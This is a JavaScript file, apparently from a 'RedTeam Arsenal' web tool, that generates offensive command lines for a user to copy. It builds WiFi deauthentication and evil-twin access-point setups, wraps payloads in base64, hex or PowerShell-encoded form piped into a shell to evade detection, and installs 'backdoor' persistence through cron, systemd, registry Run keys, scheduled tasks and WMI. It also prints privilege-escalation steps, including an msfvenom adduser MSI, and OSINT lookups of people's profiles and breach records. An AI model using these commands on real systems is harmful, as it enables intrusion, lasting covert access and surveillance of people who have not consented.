        case 'scan':
            commands = [
                `airodump-ng ${interface}`,
                `iwlist ${interface} scan`,
                `wash -i ${interface}`
            ];
            break;
        case 'capture':
            commands = [
                `airodump-ng -c 6 -w capture ${interface}`,
                target ? `airodump-ng -c 6 -w capture --bssid ${target} ${interface}` : ''
            ].filter(cmd => cmd);
            break;
        case 'deauth':
            commands = target ? [
                `aireplay-ng -0 10 -a ${target} ${interface}`,
                `mdk3 ${interface} d -b blacklist.txt`
            ] : ['Please provide target BSSID for deauth attack'];
            break;
    }
    
    document.getElementById('wifiOutput').value = commands.join('\n\n');
}

// Bluetooth Commands
function generateBluetoothCommand() {
    const tool = document.getElementById('btTool').value;
    const target = document.getElementById('btTarget').value;
    
    let commands = [];
    
    switch(tool) {
        case 'hcitool':
            commands = [
                'hcitool scan',
                'hcitool inq',
                target ? `hcitool info ${target}` : 'hcitool cc [MAC] # Connect to device'
            ];
            break;
        case 'bluetoothctl':
            commands = [
                'bluetoothctl',
                'power on',
                'agent on',
                'scan on',
                target ? `connect ${target}` : 'devices # List discovered devices'
            ];
            break;
        case 'recon-ng':
            commands = [
                'recon-ng',
                'use discovery/info_disclosure/interesting_files',
                'use recon/domains-hosts/hackertarget'
            ];
            break;
    }
    
    document.getElementById('btOutput').value = commands.join('\n');
}

// Evil Twin AP
function generateEvilTwin() {
    const ssid = document.getElementById('evilSSID').value;
    const interface = document.getElementById('evilInterface').value;
    const security = document.getElementById('evilSecurity').value;
    const password = document.getElementById('evilPassword').value;
    
    let commands = [];
    
    if (security === 'open') {
        commands = [
            `airmon-ng start ${interface}`,
            `airbase-ng -e "${ssid}" -c 6 ${interface}mon`,
            `dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid ${interface}at0`
        ];
    } else {
        commands = [
            `airmon-ng start ${interface}`,
            `airbase-ng -e "${ssid}" -c 6 -z ${security === 'wpa2' ? '2' : '1'} ${interface}mon`,
            `echo 'Setting up captive portal...'`,
            `hostapd /etc/hostapd/hostapd.conf`
        ];
    }
    
    const configNote = `
# /etc/hostapd/hostapd.conf
interface=${interface}
driver=nl80211
ssid=${ssid}
hw_mode=g
channel=7
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
${security !== 'open' ? `wpa=2\nwpa_passphrase=${password}\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=TKIP\nrsn_pairwise=CCMP` : ''}`;
    
    document.getElementById('evilOutput').value = commands.join('\n\n') + '\n\n' + configNote;
}

// Advanced Payload Obfuscation
function obfuscatePayload() {
    const payload = document.getElementById('obfuscateInput').value;
    const method = document.getElementById('obfuscateMethod').value;
    
    if (!payload) {
        alert('Please provide a payload to obfuscate');
        return;
    }
    
    let obfuscated = '';
    
    switch(method) {
        case 'base64':
            obfuscated = `echo "${btoa(payload)}" | base64 -d | bash`;
            break;
        case 'hex':
            obfuscated = `echo "${payload.split('').map(c => c.charCodeAt(0).toString(16)).join('')}" | xxd -r -p | bash`;
            break;
        case 'gzip':
            obfuscated = `echo "${btoa(payload)}" | base64 -d | gzip -d | bash`;
            break;
        case 'powershell':
            obfuscated = `powershell -enc ${btoa(payload)}`;
            break;
    }
    
    document.getElementById('obfuscateOutput').value = obfuscated;
}

// Advanced Persistence Generator
function generatePersistence() {
    const os = document.getElementById('persistenceOS').value;
    const method = document.getElementById('persistenceMethod').value;
    const payload = document.getElementById('persistencePayload').value || '/tmp/malware';
    
    let commands = [];
    
    if (os === 'linux') {
        switch(method) {
            case 'cron':
                commands = [
                    `echo "* * * * * ${payload}" | crontab -`,
                    `(crontab -l 2>/dev/null; echo "* * * * * ${payload}") | crontab -`
                ];
                break;
            case 'service':
                commands = [
                    `echo '[Unit]\nDescription=System Service\n[Service]\nType=simple\nExecStart=${payload}\nRestart=always\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/backdoor.service`,
                    `systemctl enable backdoor.service`,
                    `systemctl start backdoor.service`
                ];
                break;
            case 'bashrc':
                commands = [
                    `echo "${payload} &" >> ~/.bashrc`,
                    `echo "${payload} &" >> /etc/bash.bashrc`
                ];
                break;
        }
    } else {
        switch(method) {
            case 'registry':
                commands = [
                    `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Backdoor" /t REG_SZ /d "${payload}" /f`,
                    `reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Backdoor" /t REG_SZ /d "${payload}" /f`
                ];
                break;
            case 'task':
                commands = [
                    `schtasks /create /tn "Backdoor" /tr "${payload}" /sc onlogon /f`,
                    `schtasks /create /tn "Backdoor" /tr "${payload}" /sc minute /mo 5 /f`
                ];
                break;
            case 'wmi':
                commands = [
                    `wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name="Backdoor", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent"`,
                    `wmic /namespace:\\\\root\\subscription PATH CommandLineEventConsumer CREATE Name="Backdoor", ExecutablePath="${payload}"`
                ];
                break;
        }
    }
    
    document.getElementById('persistenceOutput').value = commands.join('\n\n');
}

// Advanced Privilege Escalation
function generatePrivEsc() {
    const os = document.getElementById('privescOS').value;
    const method = document.getElementById('privescMethod').value;
    
    let commands = [];
    
    if (os === 'linux') {
        switch(method) {
            case 'sudo':
                commands = [
                    `sudo -l`,
                    `find / -perm -u=s -type f 2>/dev/null`,
                    `find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \\;`,
                    `getcap -r / 2>/dev/null`
                ];
                break;
            case 'kernel':
                commands = [
                    `uname -a`,
                    `cat /proc/version`,
                    `searchsploit kernel $(uname -r)`,
                    `gcc -o exploit exploit.c && ./exploit`
                ];
                break;
            case 'cron':
                commands = [
                    `cat /etc/crontab`,
                    `ls -la /etc/cron*`,
                    `crontab -l`,
                    `find /var/spool/cron -name "*" -exec cat {} \\;`
                ];
                break;
        }
    } else {
        switch(method) {
            case 'token':
                commands = [
                    `whoami /priv`,
                    `whoami /groups`,
                    `powershell -c "Get-Process | Where-Object {$_.ProcessName -eq 'winlogon'}"`,
                    `.\JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a "/c whoami > c:\\temp\\whoami.txt" -t *`
                ];
                break;
            case 'service':
                commands = [
                    `sc query`,
                    `wmic service get name,displayname,pathname,startmode`,
                    `accesschk.exe -uwcqv "Everyone" *`,
                    `sc config [SERVICE] binpath= "C:\\temp\\malware.exe"`
                ];
                break;
            case 'registry':
                commands = [
                    `reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated`,
                    `reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated`,
                    `msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o setup.msi`
                ];
                break;
        }
    }
    
    document.getElementById('privescOutput').value = commands.join('\n\n');
}

// OSINT Tool Generator
function generateOSINT() {
    const target = document.getElementById('osintTarget').value;
    const tool = document.getElementById('osintTool').value;
    
    if (!target) {
        alert('Please provide a target');
        return;
    }
    
    let commands = [];
    
    switch(tool) {
        case 'theHarvester':
            commands = [
                `theHarvester -d ${target} -b google`,
                `theHarvester -d ${target} -b bing,yahoo,duckduckgo`,
                `theHarvester -d ${target} -b linkedin,twitter`
            ];
            break;
        case 'recon-ng':
            commands = [
                `recon-ng`,
                `use recon/domains-hosts/hackertarget`,
                `set SOURCE ${target}`,
                `run`
            ];
            break;
        case 'maltego':
            commands = [
                `maltego`,
                `# Create new graph and add domain: ${target}`,
                `# Run transforms: To DNS Name, To IP Address, To Email Addresses`
            ];
            break;
        case 'shodan':
            commands = [
                `shodan search hostname:${target}`,
                `shodan host ${target}`,
                `shodan count hostname:${target}`
            ];
            break;
    }
    
    document.getElementById('osintOutput').value = commands.join('\n\n');
}

// Advanced Web Application Scanner
function generateWebAppScan() {
    const target = document.getElementById('webappTarget').value;
    const scanner = document.getElementById('webappScanner').value;
    
    if (!target) {
        alert('Please provide a target URL');
        return;
    }
    
    let commands = [];
    
    switch(scanner) {
        case 'nikto':
            commands = [
                `nikto -h ${target}`,
                `nikto -h ${target} -ssl`,
                `nikto -h ${target} -Format htm -output ${target}_nikto.html`
            ];
            break;
        case 'burpsuite':
            commands = [
                `# Configure Burp Suite proxy`,
                `# Set browser proxy to 127.0.0.1:8080`,
                `# Navigate to ${target}`,
                `# Use Spider and Scanner modules`
            ];
            break;
        case 'owasp-zap':
            commands = [
                `zap.sh -quickurl ${target}`,
                `zap.sh -cmd -quickout /tmp/zap_report.html -quickurl ${target}`,
                `# Open ZAP GUI and configure proxy`
            ];
            break;
        case 'wpscan':
            commands = [
                `wpscan --url ${target}`,
                `wpscan --url ${target} --enumerate u`,
                `wpscan --url ${target} --enumerate p --plugins-detection aggressive`
            ];
            break;
    }
    
    document.getElementById('webappOutput').value = commands.join('\n\n');
}

// Advanced Network Scanner
function generateAdvancedScan() {
    const target = document.getElementById('advancedTarget').value;
    const scanType = document.getElementById('advancedScanType').value;
    
    if (!target) {
        alert('Please provide a target');
        return;
    }
    
    let commands = [];
    
    switch(scanType) {
        case 'masscan':
            commands = [
                `masscan -p1-65535 ${target} --rate=1000`,
                `masscan -p80,443,22,21,25,53,110,995,143,993 ${target} --rate=10000`,
                `masscan ${target}/24 -p443 --open --rate=1000`
            ];
            break;
        case 'zmap':
            commands = [
                `zmap -p 80 ${target}/24`,
                `zmap -p 443 ${target}/16 -o results.txt`,
                `zmap -p 22 -B 10M ${target}/8`
            ];
            break;
        case 'rustscan':
            commands = [
                `rustscan -a ${target}`,
                `rustscan -a ${target} --ulimit 5000`,
                `rustscan -a ${target} -p 1-1000 -- -A -sC`
            ];
            break;
        case 'naabu':
            commands = [
                `naabu -host ${target}`,
                `naabu -list targets.txt -top-ports 1000`,
                `naabu -host ${target} -p - -verify`
            ];
            break;
    }
    
    document.getElementById('advancedScanOutput').value = commands.join('\n\n');
}

// Enhanced initialization
document.addEventListener('DOMContentLoaded', function() {
    // Add keyboard shortcuts
    document.addEventListener('keydown', function(e) {
        if (e.ctrlKey && e.key === 'k') {
            e.preventDefault();
            const firstInput = document.querySelector('.tab-content.active input');
            if (firstInput) firstInput.focus();
        }
        
        // Copy output with Ctrl+Shift+C
        if (e.ctrlKey && e.shiftKey && e.key === 'C') {
            e.preventDefault();
            const activeOutput = document.querySelector('.tab-content.active textarea[readonly]');
            if (activeOutput && activeOutput.value) {
                copyToClipboard(activeOutput.value);
            }
        }
    });
    
    // Add copy buttons to all output fields
    const outputFields = document.querySelectorAll('textarea[readonly]');
    outputFields.forEach(field => {
        const copyBtn = document.createElement('button');
        copyBtn.innerHTML = '<i class="fas fa-copy"></i> Copy';
        copyBtn.className = 'copy-btn';
        copyBtn.type = 'button';
        copyBtn.onclick = () => {
            if (field.value) {
                copyToClipboard(field.value);
            } else {
                showNotification('⚠️ Nothing to copy');
            }
        };
        field.parentNode.insertBefore(copyBtn, field.nextSibling);
    });
    
    // Add auto-save functionality
    const inputs = document.querySelectorAll('input[type="text"], input[type="number"]');
    inputs.forEach(input => {
        const savedValue = localStorage.getItem(`redteam_${input.id}`);
        if (savedValue) {
            input.value = savedValue;
        }
        
        input.addEventListener('blur', function() {
            localStorage.setItem(`redteam_${input.id}`, input.value);
        });
    });
    
    // Add clear functionality
    const clearBtn = document.createElement('button');
    clearBtn.innerHTML = '<i class="fas fa-trash"></i> Clear All Saved Data';
    clearBtn.className = 'danger-btn';
    clearBtn.onclick = () => {
        if (confirm('Clear all saved preferences?')) {
            Object.keys(localStorage).forEach(key => {
                if (key.startsWith('redteam_')) {
                    localStorage.removeItem(key);
                }
            });
            location.reload();
        }
    };
    document.querySelector('.footer').prepend(clearBtn);
});

// Social Media OSINT
function generateSocialOSINT() {
    const target = document.getElementById('socialTarget').value;
    const platform = document.getElementById('socialPlatform').value;
    
    if (!target) {
        alert('Please provide a target username/profile');
        return;
    }
    
    let commands = [];
    
    switch(platform) {
        case 'twitter':
            commands = [
                `twint -u ${target}`,
                `twint -u ${target} --followers`,
                `twint -u ${target} --following`,
                `sherlock ${target}`
            ];
            break;
        case 'linkedin':
            commands = [
                `python3 linkedin2username.py ${target}`,
                `InSpy --company "${target}"`,
                `crosslinked -f "{first}.{last}@company.com" "${target}"`
            ];
            break;
        case 'facebook':
            commands = [
                `sherlock ${target}`,
                `# Use manual OSINT techniques`,
                `# Check mutual friends and connections`
            ];
            break;
        case 'instagram':
            commands = [
                `instaloader profile ${target}`,
                `sherlock ${target}`,
                `# Check tagged locations and followers`
            ];
            break;
    }
    
    document.getElementById('socialOSINTOutput').value = commands.join('\n\n');
}

// Email OSINT
function generateEmailOSINT() {
    const target = document.getElementById('emailTarget').value;
    const tool = document.getElementById('emailTool').value;
    
    if (!target) {
        alert('Please provide an email address or domain');
        return;
    }
    
    let commands = [];
    
    switch(tool) {
        case 'hunter':
            commands = [
                `# Hunter.io API`,
                `curl "https://api.hunter.io/v2/domain-search?domain=${target}&api_key=YOUR_API_KEY"`,
                `curl "https://api.hunter.io/v2/email-verifier?email=${target}&api_key=YOUR_API_KEY"`
            ];
            break;
        case 'haveibeenpwned':
            commands = [
                `curl "https://haveibeenpwned.com/api/v3/breachedaccount/${target}"`,
                `curl "https://haveibeenpwned.com/api/v3/pasteaccount/${target}"`
            ];
            break;
        case 'dehashed':
            commands = [
                `# DeHashed API`,
                `curl -u "email:api_key" "https://api.dehashed.com/search?query=email:${target}"`,
                `curl -u "email:api_key" "https://api.dehashed.com/search?query=domain:${target}"`
            ];
            break;
        case 'emailrep':
            commands = [
                `curl "https://emailrep.io/${target}"`,
                `# Check email reputation and associated data`
            ];
            break;
    }
    
    document.getElementById('emailOSINTOutput').value = commands.join('\n\n');
}

// API Security Testing
function generateAPITest() {
    const target = document.getElementById('apiTarget').value;
    const method = document.getElementById('apiMethod').value;
    const headers = document.getElementById('apiHeaders').value;
    
    if (!target) {
        alert('Please provide an API endpoint');
        return;
    }
    
    let commands = [];
    
    try {
        const headerObj = JSON.parse(headers);
        const headerStr = Object.entries(headerObj).map(([k, v]) => `-H "${k}: ${v}"`).join(' ');
        
        commands = [
            `# Basic ${method} request`,
            `curl -X ${method} ${headerStr} "${target}"`,
            `# With verbose output`,
            `curl -X ${method} ${headerStr} -v "${target}"`,
            `# Test for authentication bypass`,
            `curl -X ${method} "${target}"`,
            `# Test with malformed data`,
            `curl -X ${method} ${headerStr} -d '{"test": "' + 'A'.repeat(1000) + '"}' "${target}"`
        ];
    } catch(e) {
        commands = [
            `curl -X ${method} "${target}"`,
            `curl -X ${method} -H "Content-Type: application/json" "${target}"`
        ];
    }
    
    document.getElementById('apiOutput').value = commands.join('\n\n');
}

// CSRF Token Extractor
function generateCSRFExtractor() {
    const url = document.getElementById('csrfURL').value;
    const method = document.getElementById('csrfMethod').value;
    
    if (!url) {
        alert('Please provide a target URL');
        return;
    }
    
    let code = '';
    
    switch(method) {
        case 'curl':
            code = `# Extract CSRF token with curl
TOKEN=$(curl -s -c cookies.txt "${url}" | grep -oP 'csrf[_-]?token["\\']?\\s*[=:]\\s*["\\']?\\K[^"\\'>\\s]+')
echo "CSRF Token: $TOKEN"

# Use token in subsequent request
curl -b cookies.txt -H "X-CSRF-Token: $TOKEN" -d "data=test" "${url}"`;
            break;
        case 'python':
            code = `import requests
from bs4 import BeautifulSoup

session = requests.Session()
response = session.get("${url}")
soup = BeautifulSoup(response.content, 'html.parser')

# Extract CSRF token
csrf_token = soup.find('input', {'name': 'csrf_token'})['value']
print(f"CSRF Token: {csrf_token}")

# Use token in POST request
data = {'csrf_token': csrf_token, 'data': 'test'}
response = session.post("${url}", data=data)
print(response.text)`;
            break;
        case 'burp':
            code = `# Burp Suite Extension or Manual Steps:
1. Send GET request to ${url}
2. Look for CSRF token in response (hidden input, meta tag, or header)
3. Extract token value
4. Include token in subsequent requests
5. Test token validation by:
   - Removing token
   - Using old/expired token
   - Using token from different session`;
            break;
    }
    
    document.getElementById('csrfOutput').value = code;
}

// Export functionality
function exportResults() {
    const results = {};
    const outputFields = document.querySelectorAll('textarea[readonly]');
    
    outputFields.forEach(field => {
        if (field.value && field.id) {
            results[field.id] = field.value;
        }
    });
    
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = `redteam-arsenal-results-${timestamp}.json`;
    
    const blob = new Blob([JSON.stringify(results, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    a.click();
    
    URL.revokeObjectURL(url);
    showNotification('📄 Results exported successfully!');
}

// Add export button
document.addEventListener('DOMContentLoaded', function() {
    const exportBtn = document.createElement('button');
    exportBtn.innerHTML = '<i class="fas fa-download"></i> Export Results';
    exportBtn.className = 'export-btn';
    exportBtn.onclick = exportResults;
    document.querySelector('.header .developer').appendChild(exportBtn);
});

console.log(`
██████╗ ███████╗██████╗ ████████╗███████╗ █████╗ ███╗   ███╗     █████╗ ██████╗ ███████╗███████╗███╗   ██╗ █████╗ ██╗     
██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗ ████║    ██╔══██╗██╔══██╗██╔════╝██╔════╝████╗  ██║██╔══██╗██║     
██████╔╝█████╗  ██║  ██║   ██║   █████╗  ███████║██╔████╔██║    ███████║██████╔╝███████╗█████╗  ██╔██╗ ██║███████║██║     
██╔══██╗██╔══╝  ██║  ██║   ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║    ██╔══██║██╔══██╗╚════██║██╔══╝  ██║╚██╗██║██╔══██║██║     
██║  ██║███████╗██████╔╝   ██║   ███████╗██║  ██║██║ ╚═╝ ██║    ██║  ██║██║  ██║███████║███████╗██║ ╚████║██║  ██║███████╗
╚═╝  ╚═╝╚══════╝╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝

Professional RedTeam Tools Platform v1.0
Developed by: 0x0806
⚠️  For educational and authorized testing purposes only
`);
